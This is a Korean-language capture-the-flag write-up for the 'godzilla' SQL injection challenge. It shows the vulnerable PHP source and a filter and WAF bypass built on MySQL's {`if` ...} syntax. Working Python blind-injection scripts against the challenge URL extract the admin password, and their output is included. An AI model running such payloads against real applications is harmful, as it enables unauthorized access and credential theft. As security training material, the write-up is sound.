# godzilla

## 1. Code
```php
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~");
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_godzilla where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) echo "<h2>Hello admin</h2>";
   
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_godzilla where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("godzilla");
  highlight_file(__FILE__);
?>
```

## 2. Condition
- `prob _ . ()`를 필터링한다.   
- 웹방화벽이 존재한다.   
&rarr; ``{`a`b}``구문을 이용한다.   
- 정확한 admin pw를 알아야 한다.   

## 3. Solution
python 스크립트를 이용해 blind-sqlinjection 한다.

a. pw의 길이
b. pw의 값


### a. Length of pw
변수명 | 값
---|---:
`pw` | 1' or {\`if\`id='admin' and length(pw)=`i`}#


비교값 `i`는 반복문을 통해 적당값(ex. 1~20)을 넣어준다.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?\
            pw=1' or {`if`id='admin' and length(pw)=%d}%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
```
---


### b. Value of pw

변수명 | 값
---|---:
`no` | 1' or {\`if\`id='admin' and ascii(substr(pw,`i`,1))=`j`}#   


a. Length of pw 의 코드에 추가해 보자.

```python
import requests

cookie = {'PHPSESSID' : '~~~~'}

for i in range(1,21):
    url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?\
            pw=1' or {`if`id='admin' and length(pw)=%d}%%23" % i
    res = requests.get(url, cookies=cookie)
    
    if "Hello admin" in res.text:
        pw_len = i
        print("Length of pw : %d" % i)
        break
        
pw_value = ""
for i in range(pw_len):
    for j in range(33,127):
        url = "https://modsec.rubiya.kr/chall/godzilla_799f2ae774c76c0bfd8429b8d5692918.php?\
                pw=1' or {`if`id='admin' and ascii(substr(pw,%d,1))=%d}%%23" % (i+1, j)
        res = requests.get(url, cookies=cookie)

        if "Hello admin" in res.text:
            pw_value += chr(j)
            print("pw(%d) : %s" % (i+1, pw_value))
            break
```

스크립트 결과는 다음과 같다.
```
Length of pw : 8
pw(1) : a
pw(2) : a1
pw(3) : a18
pw(4) : a18a
pw(5) : a18a6
pw(6) : a18a6c
pw(7) : a18a6cc
pw(8) : a18a6cc5
```
---



나온 pw 값을 최종적으로 대입해 보면 문제가 해결된다.

변수명 | 값
---|---:
`pw` | a18a6cc5